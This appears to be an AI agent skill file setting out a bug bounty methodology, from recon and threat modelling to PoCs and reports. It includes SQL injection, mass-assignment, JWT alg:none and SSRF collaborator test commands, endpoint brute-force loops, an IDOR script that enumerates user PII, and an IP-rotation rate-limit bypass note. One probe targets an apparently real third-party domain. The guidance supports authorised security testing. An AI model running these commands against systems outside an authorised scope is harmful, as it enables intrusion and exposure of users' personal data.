---
name: bug-hunter
description: "Use when performing bug bounty reconnaissance, vulnerability analysis, threat modeling, source code review, or web security testing against a target. Do NOT use for non-security development work."
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [security, bug-bounty, vulnerability, penetration-testing, web-security, source-code-review]
    related_skills: [systematic-debugging, requesting-code-review, computer-use]
---

# Bug Hunter Methodology

## Overview

Structured methodology for bug bounty engagements. This skill treats every
engagement as a hypothesis-driven investigation — not a checklist of payloads
to spray. It orchestrates existing Hermes tools (`terminal`, `browser_*`,
`web_search`, `web_extract`, `read_file`, `search_files`, `delegate_task`,
`execute_code`, `memory`, `session_search`) into a systematic process.

**Core principle:** Understand the target's architecture and data flow before
testing anything. The most expensive bug is one found by accident and never
reproduced reliably.

## When to Use

- Starting a new bug bounty target (recon → threat model → testing)
- Analyzing a web application's attack surface
- Reviewing source code for security vulnerabilities
- Analyzing Burp Suite exports, HAR files, or API specifications
- Investigating a specific vulnerability class (IDOR, SSRF, XSS, etc.)
- Writing a proof-of-concept or reproducing a reported issue

**Skip for:** Non-security code review (use `requesting-code-review`), general
debugging (use `systematic-debugging`), or when the user explicitly asks for
only a single command/payload (handle inline).

**Related skills:**
- `systematic-debugging` — use during Phase 4 (Vulnerability Deep Dive) for
  root-cause investigation of bugs found in target source code
- `requesting-code-review` — use after writing PoC code to verify it before
  submitting
- `computer-use` — use when you need to interact with native desktop security
  tools (Burp Suite Professional UI, JEB decompiler, IDA Pro)

**Supporting files in this skill:**
- `references/static-site-assessment.md` — step-by-step technique for
  producing a valid "no findings" report on static marketing pages
- `templates/report-no-findings.md` — full report template for static sites
- `templates/finding.md` — single-vulnerability report template for
  confirmed findings

## Target Classification — First Action

Before running any phase, classify the target:

| Category | Characteristics | Approach |
|----------|----------------|----------|
| **Dynamic app** | Auth, API endpoints, forms, user input | Full 6-phase methodology |
| **Static landing page** | No auth, no forms, no APIs, marketing content | Skip to Phase 1.2 tech stack → Phase 2.5 (infrastructure) → configuration audit → produce "no findings" report |
| **API-only** | No UI, programmatic interface | Skip client-side checks, focus on auth + rate limiting + injection |
| **SSR/hybrid** | Some static content + some dynamic routes | Test for improper SSR data leakage, RSC payload inspection |

**Static landing page shortcut:** If Phase 2 endpoint enumeration finds zero dynamic paths (all 404 except `/`), skip directly to infrastructure checks + security header analysis + JS bundle scan for secrets, then produce the report. Do not spend cycles on IDOR/XSS/SSRF testing when there are no endpoints to test.

---

## Methodology Phases

```
Phase 1: Reconnaissance & Threat Model
Phase 2: Attack Surface Mapping
Phase 3: Deep Analysis (Code / API / Schema / Traffic)
Phase 4: Vulnerability Deep Dive
Phase 5: Exploitation & POC
Phase 6: Documentation & Reporting
```

Complete each phase before advancing. Re-enter earlier phases when new
information changes the threat model.

---

## Phase 1: Reconnaissance & Threat Model

**Goal:** Understand the target's architecture, technology stack, auth model,
and data classification before touching a single endpoint.

### Step 1.1 — Scope Confirmation

```markdown
Always confirm scope before any testing:
- In-scope domains, subdomains, and IP ranges
- Out-of-scope assets (clearly documented)
- Allowed testing methods (automated scanners? social engineering?)
- Bug bounty program rules (disclosure policy, reward tiers)
- Target's responsible disclosure process
```

Save to memory using the `memory` tool:
```
memory action="add" target="memory" content="Bug bounty target: example.com
In-scope: *.example.com, api.example.com
Out-of-scope: admin.example.com, *.corp.example.com
Rules: No automated scanners on *.prod.example.com"
```

### Step 1.2 — Technology Stack Fingerprinting

Use existing tools to identify the stack without sending a single request
(through OSINT):

```bash
# DNS enumeration — find all subdomains
# Using cloudflare-based discovery (no request to target)
web_search "site:*.example.com -www"

# Check certificate transparency logs (passive)
# Use web_extract on crt.sh:
web_extract "https://crt.sh/?q=%25.example.com&output=json"

# Technology lookup from public sources
web_extract "https://builtwith.com/example.com"
```

Then probe live endpoints to confirm:

```bash
# HTTP response headers reveal the stack
curl -sI "https://www.example.com" | head -20

# Check for common endpoints
curl -s "https://example.com/robots.txt" 2>/dev/null
curl -s "https://example.com/sitemap.xml" 2>/dev/null
```

**Visual reconnaissance:** After the initial curl probes, use the browser
to load the page and take a screenshot. This catches client-side rendered
content, JS-triggered redirects, and visual clues (login forms, search bars,
upload buttons) that raw HTML may not reveal:

```python
browser_navigate("https://www.example.com")
browser_vision(question="Describe the page layout. Any forms, login fields, search bars, file upload buttons, or interactive elements?")
```

**Classification decision:** After the browser screenshot, classify the
target per the Target Classification table above. This determines whether
you proceed with the full methodology or take the static-site shortcut.

### Step 1.3 — Authentication & Authorization Model

Identify *before* testing any protected endpoint:

- Auth mechanism: JWT, session cookie, OAuth2, API key, Basic auth, SAML
- Authorization model: RBAC, ABAC, ACL-based, ownership-based
- MFA status: required for which operations
- Session management: token lifetime, refresh flow, CSRF protection

```bash
# Extract auth info from headers
curl -sv "https://example.com/login" 2>&1 | grep -i "set-cookie\|www-authenticate"

# Check /.well-known endpoints
curl -s "https://example.com/.well-known/openid-configuration" | head -50
curl -s "https://example.com/.well-known/security.txt" 2>/dev/null
```

### Step 1.4 — Threat Model

For each in-scope asset, build a data-flow-level threat model:

```
Asset: api.example.com/users/{id}
Data: PII (email, name, phone, address)
Auth: JWT bearer token in Authorization header
Access control: User can only read own profile
Threats:
  - IDOR via user ID enumeration (/users/1, /users/2, ...)
  - Mass assignment via PATCH /users (add role=admin)
  - Rate limiting bypass via header manipulation
  - Cache poisoning on cached profile responses
```

Ask these questions for every endpoint:
1. **Who** can access this? (unauthenticated, authenticated, admin)
2. **What** data does it handle? (public, PII, financial, credentials)
3. **Where** does the data go? (database, cache, third-party API, log)
4. **How** is access enforced? (code-level, middleware, database RLS)
5. **What** happens on failure? (500 error, stack trace, redirect to login)

Save the threat model:
```
memory action="add" target="memory" content="THREAT MODEL — example.com:
api.example.com (JWT auth, RBAC, PostgreSQL)
  /users/{id} — GET (own), PATCH (own), admin can read all
  /orders — POST (authenticated), GET (own only)
  /admin/* — admin role required
Key surface: mass assignment on PATCH, no rate limiting visible"
```

### Phase 1 Completion

- [ ] Scope boundaries documented in memory
- [ ] Technology stack identified (framework, language, server, database)
- [ ] Auth mechanism understood (type, tokens, session handling)
- [ ] Threat model built for all in-scope assets
- [ ] Data classification applied to each endpoint

---

## Phase 2: Attack Surface Mapping

**Goal:** Discover every reachable endpoint, parameter, and input vector.

### Step 2.1 — Passive Enumeration

OSINT first — never hit the target until you know the full surface:

```bash
# Wayback Machine — historical endpoints
web_extract "https://web.archive.org/cdx/search/cdx?url=*.example.com&output=text&fl=original&limit=10000"
```

Use `terminal` for local analysis:
```bash
# URLs from Wayback
curl -s "https://web.archive.org/cdx/search/cdx?url=*.example.com&output=text&fl=original&limit=5000" \
  | sort -u > /tmp/wayback_urls.txt 2>/dev/null
wc -l /tmp/wayback_urls.txt

# Extract parameter variations
grep -oP '\?[\w&=;]+' /tmp/wayback_urls.txt | sort -u
```

```bash
# JavaScript source map discovery
web_extract "https://example.com" \
  | grep -oP 'src="[^"]*\.js(\?[^"]*)?"' | head -30

# Check source maps for leaked endpoints
curl -s "https://example.com/static/js/main.js.map" 2>/dev/null | head -5
```

### Step 2.2 — Directory & Endpoint Brute-Force

When passive enumeration runs dry, use targeted brute-force:

```bash
# Common paths — curl is available, no need for gobuster
for path in api v1 v2 graphql admin swagger docs health status \
            .env .git/config backup debug test staging beta \
            wp-admin console actuator management prometheus metrics; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path")
  echo "$code https://example.com/$path"
done
```

Use `execute_code` for more systematic brute-force with rate limiting:

```python
from hermes_tools import terminal
# Run a targeted wordlist scan with rate limiting
result = terminal("""
  while IFS= read -r path; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      --max-time 3 -H "User-Agent: Mozilla/5.0" \
      "https://example.com/$path" 2>/dev/null)
    [ "$status" != "404" ] && [ "$status" != "000" ] && echo "$status $path"
    sleep 0.1
  done < /tmp/paths.txt
""", timeout=120)
```

### Step 2.3 — Parameter Discovery

Parameters are the primary input surface. Hunt for hidden ones:

```bash
# Find parameters from JS files
grep -oP '["\\']\w+["\\']\s*[:=]\s*["\\']https?://example\.com/[^"\\']+["\\']' \
  /tmp/js_files_downloaded_here.txt 2>/dev/null

# Check for debug parameters
for param in debug test admin source true disable; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/api/endpoint?$param=1")
  echo "$status ?$param"
done
```

### Step 2.4 — GraphQL Introspection

When GraphQL is detected:

```bash
# Check if introspection is enabled
curl -s -X POST "https://example.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  | head -200

# If 200, save the schema for analysis
curl -s -X POST "https://example.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}' \
  > /tmp/graphql_schema.json
```

### Step 2.5 — API Documentation Discovery

```bash
# OpenAPI / Swagger
for path in openapi.json swagger.json api-docs v3/api-docs; do
  curl -s "https://example.com/$path" | head -20
done
```

### Step 2.6 — RSC Payload Inspection (Next.js targets)

When the target runs Next.js (identified from `x-nextjs-prerender` headers
or `_next/static` chunk structure), inspect the React Server Components
payload for leaked data:

```bash
# Request the RSC stream — may expose internal state, server props,
# or data the client-side HTML doesn't show
curl -s -H "RSC: 1" -H "Accept: text/x-component" \
  "https://www.nounrich.works/" \
  | strings | grep -iE "api_key|token|secret|password|internal|localhost|staging|dev|env|email|jwt|graphql|firebase|supabase|stripe|aws|gcp|azure"
```

What to look for in RSC payloads:
- **Internal API endpoints** not visible in client JS
- **Server-side DB queries** in prerendered response data
- **Environment variable names** leaking configuration structure
- **Auth tokens** or session data rendered into server components
- **Staging/dev URLs** not meant for production

When found, save the full payload to a file for deeper analysis.

### Step 2.7 — Source Map Inspection

Next.js may publish source maps with development dependencies. Check:

```bash
# For each JS chunk, append .map
curl -s "https://example.com/_next/static/chunks/<chunk>.js.map" | head -5
# If found, download and inspect for:
# - API endpoint definitions
# - Internal-only routes
# - Environment variables
# - Schema definitions
```

When found, save to file for structured analysis in Phase 3 (source code
review via delegate_task).

When found, save to file for structured analysis in Phase 3.

### Phase 2 Completion

- [ ] All discovered URLs logged (even 403/401 — those are assets)
- [ ] JavaScript files identified for endpoint extraction
- [ ] GraphQL endpoint found and introspection tested
- [ ] API specifications (OpenAPI, Postman) collected
- [ ] Parameter variations catalogued
- [ ] Admin / hidden paths identified via status codes

---

## Phase 3: Deep Analysis

**Goal:** Analyze collected artifacts — source code, API specs, traffic
captures, GraphQL schemas — to identify vulnerability patterns.

Use `delegate_task` for each analysis type to get fresh-context reviews.
Different artifact types need different specialist context.

### Step 3.1 — Source Code Analysis

Use when you have access to the target's source code.

```python
delegate_task(
    goal="Review the provided source code for security vulnerabilities.",
    context=f"""
    Security source code review. Focus on:

    1. **Authentication & Authorization** — JWT validation, session handling,
       role checks, missing access control on admin functions
    2. **Input Validation** — SQL injection (parameterized queries?),
       command injection (shell=False?), path traversal, SSRF
    3. **Data Handling** — Mass assignment on PATCH/PUT endpoints,
       sensitive data exposure in responses, insecure deserialization
    4. **Business Logic** — Race conditions (check-then-act without locks),
       price manipulation, step-skipping in multi-step flows
    5. **Configuration** — Hardcoded secrets, debug mode enabled,
       CORS misconfiguration, insecure TLS settings
    6. **Dependencies** — Outdated libraries with known CVEs

    Files to review: {file_list if file_list else 'All .py/.js/.java files shown'}
    Key endpoints from threat model: {endpoints}

    For each finding, include:
    - The vulnerable code snippet (with file path + line number)
    - Why it's vulnerable
    - Impact (what an attacker can achieve)
    - Remediation suggestion
    - Estimated severity (Critical/High/Medium/Low/Info)
    """,
    toolsets=["terminal", "file", "search"]
)
```

**When you don't have source code**, use static analysis on what you can
access — JavaScript, HTML, source maps:

```bash
# Extract API endpoints from JS bundles
grep -rohP '["\\']/api/[^"\\']+["\\']' /tmp/js_sources/ 2>/dev/null | sort -u

# Find hardcoded tokens/secrets in JS
grep -rohPI '(?:api[_-]?key|secret|token|auth)\s*[:=]\s*["\\'][^"\\']{8,}["\\']' \
  /tmp/js_sources/ 2>/dev/null

# Extract GraphQL query/mutation names from JS
grep -rohP '(?:query|mutation)\s+\w+' /tmp/js_sources/ | sort -u
```

### Step 3.2 — API Specification Review

When you have an OpenAPI/Swagger spec:

```python
delegate_task(
    goal="Review the OpenAPI specification for security weaknesses.",
    context=f"""
    Analyze this OpenAPI specification for:

    1. **Authentication holes** — endpoints missing security requirements
    2. **Sensitive data exposure** — responses exposing PII, tokens, internal IDs
    3. **Mass assignment risk** — endpoints that accept the full model as input
    4. **Overprivileged endpoints** — admin-only actions on user-level routes
    5. **IDOR-prone patterns** — endpoints using sequential IDs as path params
    6. **Missing input validation** — string fields without maxLength or pattern
    7. **Improper rate limiting signals** — no 429 responses defined
    8. **Inconsistent auth** — mixed auth methods across endpoints

    Spec file: {spec_path}
    """,
    toolsets=["file"]
)
```

### Step 3.3 — GraphQL Schema Analysis

```python
delegate_task(
    goal="Analyze the GraphQL schema for vulnerabilities.",
    context=f"""
    Analyze this GraphQL schema for:

    1. **Over-fetching via deeply nested queries** — circular references,
       unlimited nesting, missing depth limiting
    2. **Introspection still enabled** on production
    3. **Sensitive fields** — password, email, credit card, internal IDs exposed
       in queries/mutations
    4. **Missing auth on mutations** — write operations without auth checks
    5. **Batch operations without rate limiting** — array inputs that bypass
       per-request limits
    6. **Alias-based brute-force** — field aliases bypassing rate limits
    7. **IDOR in field arguments** — queries that take user IDs as params
       without ownership verification

    Schema file: {schema_path}
    """,
    toolsets=["file"]
)
```

### Step 3.4 — HAR File Analysis

When a user provides a HAR file from browser dev tools:

```python
delegate_task(
    goal="Analyze this HAR file for security vulnerabilities.",
    context=f"""
    Analyze the provided HAR (HTTP Archive) file for:

    1. **Auth token exposure** — JWT, API keys, session cookies in URLs or
       request bodies sent to third-party domains
    2. **IDOR opportunities** — Sequential or guessable resource IDs in
       URL paths or query parameters
    3. **Cacheable sensitive responses** — GET responses containing
       auth tokens or PII without Cache-Control: no-store
    4. **Redirect chains with auth tokens** — Tokens leaked via Referer
    5. **Prototype pollution** — JSON responses with __proto__ or constructor keys
    6. **CORS misconfiguration on authenticated endpoints** — Responses
       with Access-Control-Allow-Origin: * AND credentials: true
       OR Access-Control-Allow-Origin reflected from Origin header
    7. **CSRF token absence** — State-changing POST/PUT/DELETE without
       anti-CSRF token or SameSite=Strict/Origin validation
    8. **Cache poisoning indicators** — Dynamic content served from CDN cache
       without Vary headers or Cache-Control: private
    9. **Security headers** — Missing CSP, HSTS, X-Content-Type-Options,
       X-Frame-Options on responses
    10. **HSTS hygiene** — Mixed HTTP/HTTPS on same domain

    Also extract:
    - All unique endpoints (method + URL)
    - All cookies set
    - All auth headers
    - Response headers for CORS analysis
    - cookie jars — Set-Cookie and subsequent Cookie headers per domain

    HAR file location: {har_path}
    """,
    toolsets=["file", "terminal"]
)
```

### Step 3.5 — Burp Suite Export Analysis

When a user provides Burp Suite exports (XML or JSON):

```python
delegate_task(
    goal="Analyze Burp Suite exported traffic for vulnerabilities.",
    context=f"""
    Analyze these Burp Suite requests/responses for:

    1. Everything listed in HAR file analysis (same patterns apply)
    2. **Request smuggling indicators** — CL.TE or TE.CL patterns in
       duplicate Content-Length / Transfer-Encoding headers
    3. **Parameter pollution** — Duplicate params or array-style params
       in query string or POST body
    4. **Serialized objects** — Java, .NET, PHP, or Python serialization
       formats in request bodies or cookies
    5. **File upload paths** — Multipart requests, check for path traversal
       in filename, MIME type restrictions, size limits
    6. **XML/XXE vectors** — XML request bodies without DOCTYPE restrictions

    Burp file: {burp_path}
    Format: {'XML' if xml else 'JSON'}

    For each finding, provide:
    - Request/response excerpt
    - Vulnerability class
    - Risk (High/Med/Low)
    """,
    toolsets=["file", "terminal"]
)
```

### Phase 3 Completion

- [ ] Source code reviewed (if available)
- [ ] API spec analyzed for security gaps
- [ ] GraphQL schema audited
- [ ] Traffic captures (HAR/Burp) analyzed
- [ ] Findings categorized and prioritized

---

## Phase 4: Vulnerability Deep Dive

**Goal:** For each high-value finding from Phases 1-3, systematically verify
and understand the root cause.

Use the `systematic-debugging` skill for each individual vulnerability
investigation. For web-based verification, use browser tools:

```python
# Step 1: Reproduce the finding with a tight feedback loop
# Using `terminal` for request-level testing:
terminal("""
  # Example: Verify IDOR on /api/users/{id}
  # Authenticated as user A, try reading user B's profile
  curl -s -H "Authorization: Bearer $TOKEN_A" \
    "https://api.example.com/users/1001" | jq '.'
""")

# Step 2: If the response contains user B's data, tighten the loop
# to make it deterministic and reproducible
terminal("""
  # Compare responses — user A's own profile vs user B's profile
  diff <(curl -s -H "Authorization: Bearer $TOKEN_A" \
    "https://api.example.com/users/$(echo $TOKEN_A | cut -d. -f2 | base64 -d 2>/dev/null | jq '.sub' 2>/dev/null)") \
    <(curl -s -H "Authorization: Bearer $TOKEN_A" \
      "https://api.example.com/users/1001")
""")
```

### Vulnerability Verification Patterns

**IDOR:**
```bash
# Test: Access another user's resource with your own auth
# Replace 1 with incremental IDs
curl -s -w "\n%{http_code}" -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/resource/2"
# Expected: 403 or 404 (resource hidden). If 200 with another user's data → IDOR
```

**SSRF:**
```bash
# Test: Use a collaborator or controlled server
# Replace target URL with your callback URL
curl -sv "https://api.example.com/fetch?url=http://YOUR-COLLABORATOR.burpcollaborator.net/test" \
  2>&1 | grep -i "location\|callback\|request"
# Check collaborator logs for incoming requests
```

**Mass Assignment:**
```bash
# Test: Add unexpected fields to the request body
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"isActive":true}' \
  "https://api.example.com/users/me"
# Check if role/is_admin was honored
```

**JWT Issues:**
```bash
# Test: Remove signature (alg:none attack)
TOKEN_MODIFIED=$(echo -n "$JWT" | sed 's/\.[^.]*$/./' | sed 's/\.$//')
# Decode header, change alg to "none", re-encode
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null
# Check: does it accept alg:none?
```

**SQL Injection:**
```bash
# Test: Classic timing-based
time curl -s -o /dev/null "https://api.example.com/users?id=1"
time curl -s -o /dev/null "https://api.example.com/users?id=1' OR SLEEP(2)--"
# If second takes 2+ seconds longer → injection vector
```

### Evidence Collection

For every verified finding, save structured evidence:

```
memory action="add" target="memory" content="FINDING — IDOR on /api/users/{id}
Target: api.example.com
Type: IDOR (Insecure Direct Object Reference)
Severity: High
Endpoint: GET /api/users/{id}
Auth: JWT bearer token
Reproduction:
  curl -s -H 'Authorization: Bearer $TOKEN_USER_A' \
    'https://api.example.com/users/1001'
  → Returns user 1001's data (full PII: email, phone, address)
  - User A cannot normally access user 1001's data
  - No ownership check on backend
Target parameter: id (integer, sequential)
Impact: Full disclosure of all user PII
Recommended fix: Add ownership verification — SELECT FROM users WHERE id=? AND owner_id=?
Reference: OWASP API Security Top 10 — API1:2023 (Broken Object Level Authorization)"
```

### Phase 4 Completion

- [ ] Each high-priority finding has a tight reproduction loop
- [ ] Vulnerability confirmed and not a false positive
- [ ] Evidence captured (response bodies, timing, collaborator logs)
- [ ] Root cause understood (code-level if source available)
- [ ] Severity assigned using industry standards

---

## Phase 5: Exploitation & POC

**Goal:** Build a reliable proof of concept that demonstrates business impact.

### Step 5.1 — Write a Reproducible POC

Use `execute_code` for scripted exploits:

```python
from hermes_tools import terminal

# Example: IDOR POC that dumps all user profiles
script = """
#!/bin/bash
# IDOR PoC: Dump user profiles via sequential ID enumeration
# Target: api.example.com

TOKEN="<user_a_jwt_token>"
BASE="https://api.example.com/users"

echo "[+] Starting IDOR enumeration..."
for id in $(seq 1 10); do
  RESPONSE=$(curl -s -w "\\n%{http_code}" \\
    -H "Authorization: Bearer $TOKEN" \\
    "$BASE/$id")
  HTTP_CODE=$(echo "$RESPONSE" | tail -1)
  BODY=$(echo "$RESPONSE" | head -n -1)
  
  if [ "$HTTP_CODE" = "200" ]; then
    NAME=$(echo "$BODY" | jq -r '.name // "unknown"')
    EMAIL=$(echo "$BODY" | jq -r '.email // "unknown"')
    echo "[+] $id -> $NAME ($EMAIL) — HTTP $HTTP_CODE"
  else
    echo "[-] $id -> HTTP $HTTP_CODE"
  fi
  sleep 0.2
done
"""

terminal(f"cat > /tmp/idor_poc.sh << 'EOF'\n{script}\nEOF\nchmod +x /tmp/idor_poc.sh")
terminal("bash /tmp/idor_poc.sh")
```

### Step 5.2 — Minimize the POC

Reduce to the tightest possible demonstration:

```bash
# Single-command POC
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.example.com/users/1001" \
  | jq '.email, .phone, .address'
```

### Step 5.3 — Verify Business Impact

Every finding needs a business impact statement:

| Finding | Technical Impact | Business Impact |
|---------|-----------------|-----------------|
| IDOR on /users/{id} | Full user PII disclosure | GDPR violation, user trust erosion |
| SQL injection on /search | Database compromise | Full data breach potential |
| No rate limiting on /auth | Credential stuffing | Account takeover at scale |
| Mass assignment on /users/me | Privilege escalation | Unauthorized admin access |

### Phase 5 Completion

- [ ] Scripted POC written and tested
- [ ] POC minimized to simplest reproduction
- [ ] Business impact documented
- [ ] POC saved for the report (Phase 6)

---

## Phase 6: Documentation & Reporting

**Goal:** Produce a submission-quality vulnerability report.

### Step 6.1 — Write the Report

Structure each finding as:

```
## Title: [Vulnerability Class] in [Endpoint]

**Type:** [CWE ID] — [Vulnerability Name]
**Severity:** Critical / High / Medium / Low
**Endpoint:** [Full URL with method]
**Date:** [Date discovered]

### Summary
One paragraph describing what was found.

### Steps to Reproduce
1. Authenticate as user A
2. Send a GET request to /api/users/1001 with user A's token
3. Observe user B's data in the response

### Proof of Concept
```bash
curl -s -H "Authorization: Bearer <token>" \
  "https://api.example.com/users/1001" | jq '.'
```

### Evidence
```json
{
  "id": 1001,
  "email": "target@example.com",
  "phone": "+1-555-1234",
  "address": "123 Victim St"
}
```

### Business Impact
Full PII disclosure of any user. Enables targeted phishing,
identity theft, and violates GDPR Article 32.

### Remediation
1. Add server-side ownership verification before returning data
2. Use non-guessable resource identifiers (UUIDs)
3. Implement proper authorization middleware

### References
- OWASP API Security Top 10 — API1:2023
- CWE-639: Authorization Bypass Through User-Controlled Key
```

### Step 6.2 — Use Memory for Cross-Session Findings

When findings span multiple sessions (common in complex targets), use `memory`
to persist the state:

```
memory action="add" target="memory" content="BAG HUNTING PROGRESS — example.com
Phase 4 complete: Verified IDOR on /api/users/{id}
  POC: /tmp/idor_poc.sh (works)
  No other critical findings yet
Next session: Test /api/orders for IDOR, CSRF on PATCH
Remaining surface: /api/admin/* (need admin creds), WebSocket at /ws
Notes: Rate limiting seems per-IP, not per-user — bypass by rotating IP"
```

### Phase 6 Completion

- [ ] Each finding has: Type, Severity, URL, Steps to Reproduce, POC, Business Impact
- [ ] Report formatted for the target's bug bounty program
- [ ] False positives explicitly filtered out
- [ ] Remediation suggestions provided
- [ ] Cross-session state persisted via memory

---

## Vulnerability Classification Quick Reference

### Web Application

| Class | CWE | Key Test | Risk | 
|-------|-----|----------|------|
| IDOR | CWE-639 | Access another user's resource with your auth | High |
| XSS | CWE-79 | Input reflected without encoding | Med-High |
| SQLi | CWE-89 | Input breaks query structure | Critical |
| SSRF | CWE-918 | Server fetches attacker-controlled URL | High-Critical |
| CSRF | CWE-352 | State change without anti-CSRF token | Med |
| Mass Assignment | CWE-915 | Unexpected fields accepted in input | High |
| XXE | CWE-611 | XML parser processes external entities | High-Critical |
| Race Condition | CWE-362 | Check-then-act without lock | Med-High |
| Path Traversal | CWE-22 | `../` in file paths | High |
| Open Redirect | CWE-601 | Redirect parameter to external URL | Low-Med |
| SSTI | CWE-1336 | Template syntax evaluated in input | High-Critical |
| Prototype Pollution | CWE-1321 | `__proto__` in JSON accepted | Med |
| JWT alg:none | CWE-345 | Signature bypass | Critical |
| Cache Poisoning | CWE-525 | Dynamic content cached without Vary | Med-High |
| HTTP Smuggling | CWE-444 | CL.TE / TE.CL discrepancy | High-Critical |

### API-Specific

| Class | OWASP API Top 10 | Key Test |
|-------|------------------|----------|
| BOLA (IDOR for APIs) | API1:2023 | Object-level authorization bypass |
| BOLA for Functions | API2:2023 | Unauthorized function/method access |
| Excessive Data Exposure | API3:2023 | Full object returned instead of filtered fields |
| Rate Limiting Missing | API4:2023 | Unlimited requests to auth endpoints |
| Mass Assignment | API5:2023 | Unwanted fields accepted in PATCH/PUT |

### Authentication & Tokens

| Class | CWE | Key Check |
|-------|-----|-----------|
| Weak JWT Secret | CWE-345 | Brute-force secret with `hashcat -m 16500` |
| JWT alg:none | CWE-345 | Accept unsigned tokens |
| JWT Alg Confusion | CWE-345 | Switch RS256 → HS256 with public key as secret |
| Token in URL | CWE-598 | Auth token in query parameter |
| Weak Session ID | CWE-331 | Predictable/sequential session cookies |

---

## Common Pitfalls

1. **Testing without a threat model.** Payloads without a threat model are
   random noise. Always complete Phase 1 first.
2. **Attacking a static page like a dynamic app.** If all paths return 404
   except `/`, the target is a marketing page. Stop searching for IDOR/XSS
   and produce a configuration-audit report instead.
3. **Skipping passive recon.** Wayback, crt.sh, and JS analysis find more
   endpoints than active scanning and don't alert the target.
4. **No reproduction loop.** A finding you can't reproduce reliably is not
   a finding. Build the loop before declaring a vulnerability.
5. **Only testing happy-path auth.** Test without auth headers, with expired
   tokens, with tokens from other users, and with malformed tokens.
6. **Ignoring 403/401 responses.** A 403 means an endpoint exists. It might
   be vulnerable through a different method or header manipulation.
7. **No rate limiting awareness.** Bursting 1000 requests without throttling
   gets you blocked, WAF-triggered, and the finding dismissed.
8. **Forgetting the Referer/Origin check.** Many apps check one but not the
   other. Test both.
9. **Assuming UUIDs are secure.** Sequential UUIDs (UUIDv1) are enumerable.
   Check the UUID version.
10. **Testing on production without permission.** Always confirm the scope.
    A critical RCE on the wrong host gets you banned — or worse.
11. **Not saving context between sessions.** Use `memory` for cross-session
    findings and progress. A three-day engagement where you re-discover
    endpoints every session is wasted effort.
12. **Overlooking platform-specific configuration weaknesses.** Next.js on
    Vercel: check Vercel Live Feedback inclusion, `_next/static` asset
    exposure, `x-vercel-*` headers for cache/edge info, source maps in JS
    bundles, RSC payload for leaked data — these are the real attack surface
    on a static site, not injection flaws.

## Verification Checklist

- [ ] Target scope confirmed and stored in memory
- [ ] Technology stack identified
- [ ] Auth model fully understood (not just type — where enforcement lives)
- [ ] Threat model built before any active testing
- [ ] Passive recon completed (Wayback, crt.sh, JS analysis)
- [ ] All endpoints discovered and documented
- [ ] HAR/Burp exports (if provided) analyzed with fresh-context delegate
- [ ] Source code (if available) reviewed by independent subagent
- [ ] Each verified finding has a tight, reproducible POC
- [ ] Business impact documented for each finding
- [ ] Report formatted for the target's submission system
- [ ] Cross-session engagement state saved to memory
- [ ] False positives explicitly ruled out and documented
